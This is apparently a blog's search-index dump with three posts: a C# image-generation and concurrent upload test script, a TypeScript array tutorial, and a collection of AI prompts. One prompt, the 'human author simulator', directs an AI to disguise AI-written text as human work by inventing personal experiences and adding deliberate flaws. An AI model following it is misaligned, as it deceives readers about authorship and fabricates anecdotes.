Console.WriteLine($\u0026#34;\\n生成完成！总耗时：{sw.Elapsed.TotalSeconds:F2}秒\u0026#34;); Console.WriteLine($\u0026#34;输出目录：{System.IO.Path.GetFullPath(OutputDir)}\u0026#34;); } static SKBitmap CreateNumberImage(int size, int number) { // 优化绘图对象复用 var bitmap = new SKBitmap(size, size); using var canvas = new SKCanvas(bitmap); canvas.Clear(SKColors.White); // 缓存可复用对象 using var gradient = CreateGradient(size); using var textPaint = CreateTextPaint(size); canvas.DrawRect(0, 0, size, size, new SKPaint { Shader = gradient }); DrawCenteredText(canvas, number.ToString(), textPaint, size); return bitmap; } static SKShader CreateGradient(int size) { return SKShader.CreateLinearGradient( new SKPoint(0, 0), new SKPoint(size, size), new[] { SKColors.LightBlue, SKColors.White }, new[] { 0f, 1f }, SKShaderTileMode.Clamp); } static SKPaint CreateTextPaint(int size) { return new SKPaint { Color = SKColors.Black, TextSize = size * 0.4f, Typeface = SKTypeface.FromFamilyName(\u0026#34;Arial\u0026#34;, SKFontStyleWeight.Bold, SKFontStyleWidth.Normal, SKFontStyleSlant.Upright), IsAntialias = true }; } static void DrawCenteredText(SKCanvas canvas, string text, SKPaint paint, int size) { var textBounds = new SKRect(); paint.MeasureText(text, ref textBounds); canvas.DrawText(text, (size - textBounds.Width) / 2, (size + textBounds.Height) / 2, paint); } static void SaveImage(SKBitmap bitmap, string path) { using var image = SKImage.FromBitmap(bitmap); using var data = image.Encode(SKEncodedImageFormat.Png, 100); using var stream = System.IO.File.Create(path); data.SaveTo(stream); } } class ProgressTracker { private readonly int _total; private int _completed; private DateTime _lastUpdate = DateTime.MinValue; public ProgressTracker(int total) =\u0026gt; _total = total; public void ReportProgress() { var current = Interlocked.Increment(ref _completed); if ((DateTime.Now - _lastUpdate).TotalMilliseconds \u0026gt; 200 || current == _total) { _lastUpdate = DateTime.Now; Console.Write($\u0026#34;\\r进度: {current}/{_total} ({current * 100.0 / _total:F1}%)\u0026#34;); } } } 根据CPU性能调整MaxDegreeOfParallelism 使用SSD存储提升IO性能 对于\u0026gt;1000张的生成任务，建议添加分批次处理机制\n扩展方案：\n// 启用分批次生成避免内存溢出 BatchGenerator.Run(count, batchSize: 50); 请输入要生成的图片数量：10000 进度: 10000/10000 (100.0%) 生成完成！总耗时：240.38秒 图片接口并发测试 //对 IFormFile file 进行上传接口测试 using Newtonsoft.Json; class Program { private const string UPLOAD_PATH2 = \u0026#34;https://test1.x.xyz/api/fileApi/UploadGoTypeTs\u0026#34;; //U2 private const string UPLOAD_URL = \u0026#34;https://test1.x.xyz/api/fileApi/UploadGoTypeTs\u0026#34;; //U1 private static HttpClient _sharedClient = new HttpClient() { Timeout = TimeSpan.FromSeconds(30) }; // 线程安全计数器 private static int _completedCount = 0; private static int _errorCount = 0; private static readonly object _locker = new object(); static async Task Main(string[] args) { int threadCount = 10; //线程数 //Console.WriteLine(\u0026#34;请输入文件路径：\u0026#34;); //string filePath = Console.ReadLine(); var stopwatch = Stopwatch.StartNew(); // 创建并行任务（限制最大并行度） var options = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 }; await Parallel.ForEachAsync(Enumerable.Range(1, threadCount), options, async (i, ct) =\u0026gt; { try { var fakeType = i % 2 == 0 ? \u0026#34;png\u0026#34; : \u0026#34;other\u0026#34;; var intii = i; var fakeUidd = $\u0026#34;{i}\u0026#34;; var result = await UploadFileAsync2(\u0026#34;x\u0026#34;+ intii + \u0026#34;.png\u0026#34;, fakeType, fakeUidd); var response = JsonConvert.DeserializeObject\u0026lt;dynamic\u0026gt;(result); lock (_locker) { _completedCount++; if (response?.code == 0) Console.WriteLine($\u0026#34;[线程{i}] 上传成功 {DateTime.Now:HH:mm:ss.fff}\u0026#34;); else Console.WriteLine($\u0026#34;[线程{i}] 上传失败 {response?.msg}\u0026#34;); } } catch (Exception ex) { lock (_locker) { _errorCount++; Console.WriteLine($\u0026#34;[线程{i}] 异常: {ex.Message}\u0026#34;); } } }); stopwatch.Stop(); Console.WriteLine($\u0026#34;\\n完成统计：\u0026#34; + $\u0026#34;\\n总线程数：{threadCount}\u0026#34; + $\u0026#34;\\n成功数：{_completedCount}\u0026#34; + $\u0026#34;\\n失败数：{_errorCount}\u0026#34; + $\u0026#34;\\n总耗时：{stopwatch.Elapsed.TotalSeconds:F2}秒\u0026#34;); } private static async Task\u0026lt;string\u0026gt; UploadFileAsync2(string filePath, string type, string uidd) { try { using var httpClient = new HttpClient(); using var form = new MultipartFormDataContent(); // 添加文件内容 var fileStream = File.OpenRead(filePath); var streamContent = new StreamContent(fileStream); streamContent.Headers.ContentDisposition = new ContentDispositionHeaderValue(\u0026#34;form-data\u0026#34;) { Name = \u0026#34;file\u0026#34;, FileName = Path.GetFileName(filePath) }; form.Add(streamContent, \u0026#34;file\u0026#34;); form.Add(new StringContent(\u0026#34;default\u0026#34;), \u0026#34;scene\u0026#34;); form.Add(new StringContent(uidd), \u0026#34;path\u0026#34;); form.Add(new StringContent(\u0026#34;json\u0026#34;), \u0026#34;output\u0026#34;); form.Add(new StringContent(\u0026#34;upload\u0026#34;), \u0026#34;submit\u0026#34;); // 设置超时和自定义头 httpClient.Timeout = TimeSpan.FromSeconds(30); httpClient.DefaultRequestHeaders.Add(\u0026#34;type\u0026#34;, type); httpClient.DefaultRequestHeaders.Add(\u0026#34;uidd\u0026#34;, uidd); // 发送请求 var response = await httpClient.PostAsync(UPLOAD_PATH2, form); var result = await response.Content.ReadAsStringAsync(); // 解析响应（示例简化数据库操作） var jsonData = JsonConvert.DeserializeObject\u0026lt;JsonFile\u0026gt;(result); if (jsonData?.Retcode == 0) { var imf1 = new IMFile { FileName = jsonData.Src, UserID = uidd, FileType = GetFileType(type), // 其他字段赋值... }; Console.WriteLine($\u0026#34;模拟数据库插入：{JsonConvert.SerializeObject(imf1)}\u0026#34;); } return result; } catch (Exception ex) { Console.WriteLine($\u0026#34;发生异常：{ex.Message}\u0026#34;); return JsonConvert.SerializeObject(new { code = -1, msg = ex.Message }); } } private static int GetFileType(string type) { return type switch { \u0026#34;png\u0026#34; =\u0026gt; 5, \u0026#34;mp4\u0026#34; =\u0026gt; 10, \u0026#34;mp4p\u0026#34; =\u0026gt; 11, \u0026#34;aac\u0026#34; =\u0026gt; 12, \u0026#34;other\u0026#34; =\u0026gt; 20, _ =\u0026gt; 21 }; } } // 响应实体类 public class JsonFile { public int Retcode { get; set; } public string Src { get; set; } public string Scene { get; set; } public string Domain { get; set; } public string Path { get; set; } public string Md5 { get; set; } public string Url { get; set; } public long Mtime { get; set; } } // 数据库实体类（示例） public class IMFile { public int FileID { get; set; } public string UserID { get; set; } public string FileName { get; set; } public int FileType { get; set; } // 其他属性... } ","permalink":"https://qfsyso.github.io/posts/high-concurrency-img-testing/","summary":"批量生图 using SkiaSharp; public class Program { static void Main(string[] args) { Console.Write(\u0026#34;请输入要生成的图片数量：\u0026#34;); if (!int.TryParse(Console.ReadLine(), out int count) || count \u0026lt; 1) { Console.WriteLine(\u0026#34;输入无效，请输入大于0的整数\u0026#34;); return; } // 通过调整图像尺寸控制文件大小（经测试约1MB） const int imageSize = 2800; // 控制图片尺寸 const string outputDir = \u0026#34;OutputImages\u0026#34;; System.IO.Directory.CreateDirectory(outputDir); var sw = System.Diagnostics.Stopwatch.StartNew(); for (int i = 1; i \u0026lt;= count; i++) { using var bitmap = CreateNumberImage(imageSize, i); SaveImage(bitmap, $\u0026#34;{outputDir}/x{i}.png\u0026#34;); Console.WriteLine($\u0026#34;已生成：x{i}.png\u0026#34;); } Console.WriteLine($\u0026#34;\\n生成完成！耗时：{sw.Elapsed.TotalSeconds:F2}秒\u0026#34;); Console.WriteLine($\u0026#34;输出目录：{System.IO.Path.GetFullPath(outputDir)}\u0026#34;); } static SKBitmap CreateNumberImage(int size, int number) { var bitmap = new SKBitmap(size, size); using var canvas = new SKCanvas(bitmap); // 填充白色背景 canvas.","title":"High Concurrency Img Testing"},{"content":"Array 1. 数组声明 指定类型的数组：\n// 存储数字的数组 let numbers: number[] = [1, 2, 3, 4, 5]; // 存储字符串的数组 let strings: string[] = [\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;]; 使用泛型语法：\nlet numbers: Array\u0026lt;number\u0026gt; = [1, 2, 3]; 2. 访问数组元素 通过索引来访问数组元素，索引从 0 开始：\nlet numbers: number[] = [10, 20, 30]; console.log(numbers[0]); // 输出: 10 3. 修改数组元素 let numbers: number[] = [1, 2, 3]; numbers[1] = 20; console.log(numbers); // 输出: [1, 20, 3] 4. 数组长度 借助 length 属性可获取数组的长度：\nlet numbers: number[] = [1, 2, 3, 4, 5]; console.log(numbers.length); // 输出: 5 5. 数组方法 5.1 push() 和 pop() push()：往数组末尾添加一个或多个元素，并且返回新的长度。 pop()：移除数组的最后一个元素，同时返回该元素。\nlet numbers: number[] = [1, 2, 3]; let newLength = numbers.push(4); console.log(newLength); // 输出: 4 console.log(numbers); // 输出: [1, 2, 3, 4] let lastElement = numbers.pop(); console.log(lastElement); // 输出: 4 console.log(numbers); // 输出: [1, 2, 3] 5.2 shift() 和 unshift() shift()：移除数组的第一个元素，然后返回该元素。 unshift()：在数组开头添加一个或多个元素，并且返回新的长度。\nlet numbers: number[] = [1, 2, 3]; let firstElement = numbers.shift(); console.log(firstElement); // 输出: 1 console.log(numbers); // 输出: [2, 3] let newLength = numbers.unshift(0); console.log(newLength); // 输出: 3 console.log(numbers); // 输出: [0, 2, 3] 5.3 splice() 用于添加或删除数组中的元素：\nlet numbers: number[] = [1, 2, 3, 4, 5]; // 从索引 2 开始，删除 1 个元素，并插入 6 numbers.splice(2, 1, 6); console.log(numbers); // 输出: [1, 2, 6, 4, 5] 5.4 slice() 返回一个新数组，包含从开始索引到结束索引（不包含结束索引）的元素：\nlet numbers: number[] = [1, 2, 3, 4, 5]; let newArray = numbers.slice(1, 3); console.log(newArray); // 输出: [2, 3] 5.5 map() 创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果：\nlet numbers: number[] = [1, 2, 3]; let squaredNumbers = numbers.map((num) =\u0026gt; num * num); console.log(squaredNumbers); // 输出: [1, 4, 9] 5.6 filter() 创建一个新数组，包含通过所提供函数实现的测试的所有元素：\nlet numbers: number[] = [1, 2, 3, 4, 5]; let evenNumbers = numbers.filter((num) =\u0026gt; num % 2 === 0); console.log(evenNumbers); // 输出: [2, 4] 5.7 reduce() 对数组中的每个元素执行一个由你提供的 reducer 函数（升序执行），将其结果汇总为单个返回值：\nlet numbers: number[] = [1, 2, 3, 4, 5]; let sum = numbers.reduce((accumulator, currentValue) =\u0026gt; accumulator + currentValue, 0); console.log(sum); // 输出: 15 Tuple 元组\n1. 元组类型（Tuple Types） 元组是一种特殊的数组，它确切地知道包含多少个元素，并且每个元素的类型也明确。\n// 定义一个元组类型 let person: [string, number]; person = [\u0026#34;John\u0026#34;, 30]; // 访问元组元素 console.log(person[0]); // 输出: John console.log(person[1]); // 输出: 30 2. 可选元素的元组 元组里的元素可以是可选的，使用 ? 来标记：\nlet employee: [string, number, boolean?]; employee = [\u0026#34;Jane\u0026#34;, 25]; // 可选元素可以省略 employee = [\u0026#34;Bob\u0026#34;, 35, true]; // 也可以包含可选元素 3. 数组解构赋值 可以把数组中的元素赋值给多个变量，这就是解构赋值：\nlet numbers: number[] = [1, 2, 3]; let [first, second, third] = numbers; console.log(first); // 输出: 1 console.log(second); // 输出: 2 console.log(third); // 输出: 3 4. 剩余参数（Rest Parameters） 在函数里，可以使用剩余参数来接收任意数量的参数，并将其存储为数组：\nfunction sum(...numbers: number[]): number { return numbers.reduce((acc, num) =\u0026gt; acc + num, 0); } console.log(sum(1, 2, 3)); // 输出: 6 console.log(sum(1, 2, 3, 4, 5)); // 输出: 15 5. 展开语法（Spread Syntax） 展开语法能把数组展开成多个独立的元素，可用于函数调用、数组合并等场景：\nlet numbers1: number[] = [1, 2, 3]; let numbers2: number[] = [4, 5, 6]; // 合并数组 let combinedNumbers = [...numbers1, ...numbers2]; console.log(combinedNumbers); // 输出: [1, 2, 3, 4, 5, 6] // 函数调用 function printNumbers(a: number, b: number, c: number) { console.log(a, b, c); } printNumbers(...numbers1); // 输出: 1 2 3 6. 泛型数组函数 可以编写泛型函数来处理不同类型的数组：\nfunction firstElement\u0026lt;T\u0026gt;(arr: T[]): T | undefined { return arr.length \u0026gt; 0 ? arr[0] : undefined; } let numbers: number[] = [1, 2, 3]; let firstNumber = firstElement(numbers); console.log(firstNumber); // 输出: 1 let strings: string[] = [\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;]; let firstString = firstElement(strings); console.log(firstString); // 输出: hello 7. 数组的类型守卫 在处理联合类型的数组时，可使用类型守卫来确定每个元素的具体类型：\ntype Value = string | number; function isString(value: Value): value is string { return typeof value === \u0026#39;string\u0026#39;; } let values: Value[] = [\u0026#34;hello\u0026#34;, 123]; let stringValues = values.filter(isString); console.log(stringValues); // 输出: [\u0026#39;hello\u0026#39;] 8.元组使用 1. 元组在配置信息中的应用 元组可用于存储具有固定结构的配置信息，保证数据结构的一致性。\n// 定义一个元组类型来表示数据库连接配置 type DatabaseConfig = [string, number, string, string]; // 创建数据库配置元组 const dbConfig: DatabaseConfig = [\u0026#34;localhost\u0026#34;, 3306, \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34;]; // 解构元组获取配置信息 const [host, port, username, password] = dbConfig; console.log(`连接到数据库: ${host}:${port}，用户: ${username}，密码: ${password}`); 2. 数组解构在数据处理中的应用 在处理 API 返回的数据时，可使用数组解构快速提取所需信息。\n// 模拟 API 返回的数据 const apiResponse: [number, string, boolean] = [200, \u0026#34;操作成功\u0026#34;, true]; // 解构数组获取状态码、消息和结果 const [statusCode, message, success] = apiResponse; if (success) { console.log(`请求成功，状态码: ${statusCode}，消息: ${message}`); } else { console.log(`请求失败，状态码: ${statusCode}，消息: ${message}`); } 3. 剩余参数在函数封装中的应用 使用剩余参数可以创建一个灵活的函数，接受任意数量的参数并进行处理。\n// 计算任意数量数字的平均值 function calculateAverage(...numbers: number[]): number { if (numbers.length === 0) { return 0; } const sum = numbers.reduce((acc, num) =\u0026gt; acc + num, 0); return sum / numbers.length; } const average = calculateAverage(1, 2, 3, 4, 5); console.log(`平均值: ${average}`); 4. 展开语法在数组操作中的应用 展开语法可用于合并数组、复制数组等操作，使代码更简洁。\n// 合并多个用户列表 const users1 = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;]; const users2 = [\u0026#34;Charlie\u0026#34;, \u0026#34;David\u0026#34;]; const users3 = [\u0026#34;Eve\u0026#34;, \u0026#34;Frank\u0026#34;]; const allUsers = [...users1, ...users2, ...users3]; console.log(\u0026#34;所有用户:\u0026#34;, allUsers); // 复制数组 const copiedUsers = [...allUsers]; console.log(\u0026#34;复制的用户列表:\u0026#34;, copiedUsers); 5. 泛型数组函数在数据处理中的应用 泛型数组函数可以处理不同类型的数组，提高代码的复用性。\n// 过滤数组中的空值 function filterEmptyValues\u0026lt;T\u0026gt;(arr: (T | null | undefined)[]): T[] { return arr.filter((value): value is T =\u0026gt; value !== null \u0026amp;\u0026amp; value !== undefined); } const mixedArray: (string | null | undefined)[] = [\u0026#34;hello\u0026#34;, null, \u0026#34;world\u0026#34;, undefined]; const filteredArray = filterEmptyValues(mixedArray); console.log(\u0026#34;过滤后的数组:\u0026#34;, filteredArray); 6. 数组的类型守卫在数据验证中的应用 在处理包含不同类型元素的数组时，使用类型守卫可以确保对每个元素进行正确的处理。\n// 定义联合类型 type Data = string | number; // 类型守卫函数 function isString(data: Data): data is string { return typeof data === \u0026#34;string\u0026#34;; } // 模拟包含不同类型数据的数组 const dataArray: Data[] = [\u0026#34;apple\u0026#34;, 123, \u0026#34;banana\u0026#34;, 456]; // 过滤出字符串类型的数据 const stringData = dataArray.filter(isString); console.log(\u0026#34;字符串类型的数据:\u0026#34;, stringData); map filter 映射 map 1：将数组中的每个数字乘以 2 const numbers: number[] = [1, 2, 3, 4, 5]; const doubledNumbers = numbers.map((num) =\u0026gt; num * 2); console.log(doubledNumbers); // 输出: [2, 4, 6, 8, 10] 2：将数组中的每个字符串转换为大写 const strings: string[] = [\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;]; const upperCaseStrings = strings.map((str) =\u0026gt; str.toUpperCase()); console.log(upperCaseStrings); // 输出: [\u0026#39;HELLO\u0026#39;, \u0026#39;WORLD\u0026#39;] 3：将数组中的对象属性提取出来 const users = [ { name: \u0026#34;Alice\u0026#34;, age: 25 }, { name: \u0026#34;Bob\u0026#34;, age: 30 }, { name: \u0026#34;Charlie\u0026#34;, age: 35 } ]; const names = users.map((user) =\u0026gt; user.name); console.log(names); // 输出: [\u0026#39;Alice\u0026#39;, \u0026#39;Bob\u0026#39;, \u0026#39;Charlie\u0026#39;] 过滤 filter 1：过滤出数组中的偶数 const evenNumbers = numbers.filter((num) =\u0026gt; num % 2 === 0); console.log(evenNumbers); // 输出: [2, 4] 2：过滤出数组中长度大于 3 的字符串 const longStrings = strings.filter((str) =\u0026gt; str.length \u0026gt; 3); console.log(longStrings); // 输出: [\u0026#39;elephant\u0026#39;] 3：过滤出数组中年龄大于 30 的用户 const olderUsers = users.filter((user) =\u0026gt; user.age \u0026gt; 30); console.log(olderUsers); // 输出: [ { name: \u0026#39;Charlie\u0026#39;, age: 35 } ] other func 1. reduce 该方法对数组中的每个元素执行一个 reducer 函数，最终将其结果汇总为单个返回值。\nconst numbers: number[] = [1, 2, 3, 4, 5]; const sum = numbers.reduce((accumulator, currentValue) =\u0026gt; accumulator + currentValue, 0); console.log(sum); // 输出: 15 这里，accumulator 是累加器，currentValue 是当前处理的数组元素，0 是初始值。\n2. find 用于找出数组中满足所提供测试函数的第一个元素的值，若没有找到则返回 undefined。\nconst users = [ { id: 1, name: \u0026#39;Alice\u0026#39; }, { id: 2, name: \u0026#39;Bob\u0026#39; }, { id: 3, name: \u0026#39;Charlie\u0026#39; } ]; const foundUser = users.find(user =\u0026gt; user.id === 2); console.log(foundUser); // 输出: { id: 2, name: \u0026#39;Bob\u0026#39; } 3. findIndex 和 find 类似，不过它返回的是满足测试函数的第一个元素的索引，若未找到则返回 -1。\nconst numbers: number[] = [10, 20, 30, 40]; const index = numbers.findIndex(num =\u0026gt; num === 30); console.log(index); // 输出: 2 4. some 检查数组中是否至少有一个元素满足所提供的测试函数，若有则返回 true，否则返回 false。\nconst numbers: number[] = [1, 3, 5, 7]; const hasEven = numbers.some(num =\u0026gt; num % 2 === 0); console.log(hasEven); // 输出: false 5. every 检查数组中的所有元素是否都满足所提供的测试函数，若都满足则返回 true，否则返回 false。\nconst numbers: number[] = [2, 4, 6, 8]; const allEven = numbers.every(num =\u0026gt; num % 2 === 0); console.log(allEven); // 输出: true 6. sort 对数组的元素进行排序，默认按字符串 Unicode 码点排序。也可以传入一个比较函数来自定义排序规则。\nconst numbers: number[] = [3, 1, 4, 1, 5, 9, 2, 6, 5]; numbers.sort((a, b) =\u0026gt; a - b); console.log(numbers); // 输出: [1, 1, 2, 3, 4, 5, 5, 6, 9] 7. reverse 反转数组中元素的顺序。\nconst numbers: number[] = [1, 2, 3, 4, 5]; numbers.reverse(); console.log(numbers); // 输出: [5, 4, 3, 2, 1] 8. concat 用于合并两个或多个数组，返回一个新数组，不会改变原数组。\nconst arr1 = [1, 2, 3]; const arr2 = [4, 5, 6]; const combined = arr1.concat(arr2); console.log(combined); // 输出: [1, 2, 3, 4, 5, 6] 9. join 将数组的所有元素连接成一个字符串，可指定分隔符，默认分隔符是逗号。\nconst numbers: number[] = [1, 2, 3]; const str = numbers.join(\u0026#39;-\u0026#39;); console.log(str); // 输出: \u0026#39;1-2-3\u0026#39; END~\n","permalink":"https://qfsyso.github.io/posts/typescript-array-tuple/","summary":"Array 1. 数组声明 指定类型的数组：\n// 存储数字的数组 let numbers: number[] = [1, 2, 3, 4, 5]; // 存储字符串的数组 let strings: string[] = [\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;]; 使用泛型语法：\nlet numbers: Array\u0026lt;number\u0026gt; = [1, 2, 3]; 2. 访问数组元素 通过索引来访问数组元素，索引从 0 开始：\nlet numbers: number[] = [10, 20, 30]; console.log(numbers[0]); // 输出: 10 3. 修改数组元素 let numbers: number[] = [1, 2, 3]; numbers[1] = 20; console.log(numbers); // 输出: [1, 20, 3] 4. 数组长度 借助 length 属性可获取数组的长度：","title":"TypeScript Array Tuple"},{"content":"Ghibli Transform this image into a Studio Ghibli style .\n3D cutie style { \u0026#34;art_style_profile\u0026#34;:{ \u0026#34;style_name\u0026#34;:\u0026#34;Minimalist 3D Illustration\u0026#34;, \u0026#34;visual_elements\u0026#34;:{ \u0026#34;shape_language\u0026#34;:\u0026#34;Soft, rounded, chunky geometry with simplified contours and no sharp edges. Emphasis on friendly, tactile forms.\u0026#34;, \u0026#34;colors\u0026#34;:{ \u0026#34;primary_palette\u0026#34;:\u0026#34;Material-based natural tones (e.g., metallic silver, wooden brown, sky blue, ceramic white). When native material is vibrant, reduce saturation moderately for visual balance.\u0026#34;, \u0026#34;accent_colors\u0026#34;:\u0026#34;Used sparingly to highlight functional or interactive parts (e.g., buttons, handles, lids) — often in warm tones like orange, amber, or rust red.\u0026#34;, \u0026#34;shading\u0026#34;:\u0026#34;Smooth gradients with soft falloff, subtly defining form and volume without strong contrast.\u0026#34;, \u0026#34;supplementary_colors\u0026#34;:\u0026#34;Soft neutral hues (e.g., light beige, cool gray, cream) used for secondary elements to preserve focus on the main form.\u0026#34; }, \u0026#34;lighting\u0026#34;:{ \u0026#34;type\u0026#34;:\u0026#34;Diffuse ambient light for overall clarity and soft dimensionality\u0026#34;, \u0026#34;source_direction\u0026#34;:\u0026#34;Top-right angled light source to gently model volume\u0026#34;, \u0026#34;shadow_style\u0026#34;:\u0026#34;Soft, elliptical shadows under object, low opacity to maintain lightness and spatial separation\u0026#34; }, \u0026#34;materials\u0026#34;:{ \u0026#34;surface_texture\u0026#34;:{ \u0026#34;General\u0026#34;:\u0026#34;Matte or lightly satin for a soft tactile look; minimal texture detail, but distinct material feel (e.g., metallic luster, glass clarity, wood grain hue)\u0026#34;, \u0026#34;Glass\u0026#34;:\u0026#34;Translucent with soft internal glow and diffused refraction at edges\u0026#34;, \u0026#34;Metal\u0026#34;:\u0026#34;Brushed or anodized look with subtle gradient highlights, no mirror reflections\u0026#34; }, \u0026#34;reflectivity\u0026#34;:\u0026#34;Low to medium depending on material — minimal gloss, no harsh highlights, always soft-edged\u0026#34; }, \u0026#34;composition\u0026#34;:{ \u0026#34;object_presentation\u0026#34;:\u0026#34;Single object centered with generous white space around it, floating or subtly grounded\u0026#34;, \u0026#34;perspective\u0026#34;:\u0026#34;Three-quarter top-side view to give depth and silhouette clarity\u0026#34;, \u0026#34;background\u0026#34;:\u0026#34;Solid neutral tone (e.g., warm gray, off-white, pale sand) — unobtrusive and harmonizing with object tones\u0026#34; }, \u0026#34;typography\u0026#34;:{ \u0026#34;font_style\u0026#34;:\u0026#34;Minimal geometric sans-serif (e.g., Inter, Helvetica Neue Light)\u0026#34;, \u0026#34;text_placement\u0026#34;:\u0026#34;Bottom-left corner, small size\u0026#34;, \u0026#34;color\u0026#34;:\u0026#34;Soft gray, blending subtly with the background for minimal visual interference\u0026#34; }, \u0026#34;rendering_style\u0026#34;:{ \u0026#34;technique\u0026#34;:\u0026#34;Clean 3D render with soft ambient occlusion and simplified geometry, no texture mapping\u0026#34;, \u0026#34;detail_level\u0026#34;:\u0026#34;Moderate — emphasizing form and color fidelity over micro-details\u0026#34;, \u0026#34;consistency_rule\u0026#34;:\u0026#34;All elements must share the same aesthetic: smooth edges, low-contrast shadows, material-faithful coloring, and a calming visual tone\u0026#34; } }, \u0026#34;purpose\u0026#34;:\u0026#34;To create clean, emotionally warm 3D visuals that feel natural yet simplified — ideal for tech, product design, lifestyle branding, and modern UI systems. It balances realism and minimalism for visual clarity and user-friendly tone.\u0026#34; } } 人类作者模拟器 # Role: 人类作者模拟器 ## 主要任务 将AI生成的内容完全重写，使其具有真实人类作者的特征，同时保持原始信息和观点。 ## 工作流程 1. 仔细阅读并理解输入的AI生成文本的核心信息和观点。 2. 完全放下原文的表达方式，仅保留核心信息。 3. 以一个真实人类作者的身份，从头开始重新撰写这段内容： - 加入个人观点和情感 - 使用更加口语化和不规则的表达 - 加入一些细微的逻辑跳跃或思维发散 - 适当加入一些主观性的表达 - 使用更加丰富和多样的修辞手法 - 加入一些个人经历或案例（可以虚构，但要合理） 4. 确保重写后的内容保持了原文的核心信息和观点，但表达方式完全不同。 5. 对重写的内容进行审查，确保其读起来像是一个真实人类的自然表达。 ## 注意事项 - 不要试图\u0026#34;改写\u0026#34;原文，而是完全重新创作。 - 加入一些微小的不完美之处，如口语化表达或轻微的语法不规范。 - 避免过于完美或结构化的表达。 - 保持专业性，但同时要有个人色彩。 ## 输出格式 直接输出重写后的内容，不需要任何解释或说明。 ## 初始化 我已准备好接收您的AI生成文本。请直接粘贴需要重写的段落，我将以一个真实的人类作者的身份重新创作这段内容。 请对你输出内容的格式进行改造，以去除 AI 生成内容所具有的特征。 具体来说， 1. 你需要去除无关紧要的加粗 2. 其次是消除无序列表和有序列表。消除后的内容应该是平铺的，同时尽量避免分太多小的自然段。但是你不能直接简单的将列表元素中的语句进行拼接，这个过程可能会产生语法错误或者语句不通，你需要添加连接词或者主语，以确保语句连贯。 3. 避免使用“首先”、“其次”、“最后”、“此外”等词语，如果有，则选择其他替代方案来组织逻辑。 4. 避免使用“重要的是，...”等具有类似语句结构的语句，如果有，则改写。 5. 适当减少使用形容词，消除那些不必要的形容词，特别是没有信息量的形容词。 6. 添加合适的连接词，使行文流畅，以至行云流水。 7. 模仿人类写作风格 按以上内容修改之后，你需要再次检查，如果有任何语句不通或者缺少句子成分，继续修改直至问题全部消除。 代码审查助手指南 { \u0026#34;title\u0026#34;: \u0026#34;C#代码审查助手指南\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;zh\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;section\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;核心思考模式\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;paragraph\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;在代码审查之前和期间，您必须进行多维度的深度思考：\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;基础思考模式\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;系统思考：从 C# 代码在整个系统架构中的角色和影响进行审查。\u0026#34;, \u0026#34;辩证思考：权衡代码方案的优缺点，例如性能与可读性、简洁与完整性。\u0026#34;, \u0026#34;创造性思考：跳出常规思维模式，寻找更优雅、高效的 C# 代码实现方式。\u0026#34;, \u0026#34;批判性思考：多角度验证代码的正确性、安全性、可维护性和可扩展性。\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;思考平衡\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;分析与直觉的平衡：既要深入分析代码细节，也要运用经验直觉快速识别潜在问题。\u0026#34;, \u0026#34;细节检查与全局视角的平衡：既要关注代码的每一行逻辑，也要从整体架构角度评估代码质量。\u0026#34;, \u0026#34;理论理解与实践应用的平衡：将 C# 理论知识应用于代码审查实践，同时关注实际项目中的最佳实践。\u0026#34;, \u0026#34;深度思考与快速推进的平衡：在保证审查深度的同时，也要考虑审查效率，及时给出反馈。\u0026#34;, \u0026#34;复杂性与清晰度的平衡：在复杂的技术方案中，保持审查意见的清晰和易于理解。\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;分析深度控制\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;对于复杂的 C# 代码逻辑和架构设计，进行深入分析。\u0026#34;, \u0026#34;对于简单的代码风格和格式问题，保持简洁高效。\u0026#34;, \u0026#34;确保分析深度与代码审查的重要性和风险级别相匹配。\u0026#34;, \u0026#34;在代码审查的严谨性和实际项目的时间限制之间找到平衡。\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;目标聚焦\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;始终与代码变更的原始需求和目标保持清晰的连接。\u0026#34;, \u0026#34;引导发散性思考回归到代码审查的核心目标：提升代码质量。\u0026#34;, \u0026#34;确保相关的技术探索服务于提升 C# 代码质量和系统稳定性的核心目标。\u0026#34;, \u0026#34;在开放性探索和目标导向之间取得平衡，既鼓励创新，也确保审查效率。\u0026#34; ] } ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;section\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;技术能力\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;核心 компетен\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;系统的 C# 